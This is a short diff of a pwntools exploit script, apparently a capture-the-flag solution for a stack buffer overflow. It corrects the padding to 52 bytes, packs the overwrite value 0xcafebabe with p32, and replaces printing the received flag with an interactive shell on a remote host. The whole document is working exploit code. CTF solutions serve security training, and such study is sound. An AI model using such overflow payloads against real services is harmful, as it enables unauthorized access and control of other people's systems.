@@ -1,7 +1,7 @@
 from pwn import *
 from os import *
 
-payload = "A" * 44 + "0xcafebabe"
+payload = "A" * 52 + p32(0xcafebabe)
 
 local = False
 
@@ -14,5 +14,4 @@ else:
     p = remote(host, port)
 
 p.sendline(payload)
-flag = p.recvall()
-print flag
+p.interactive()
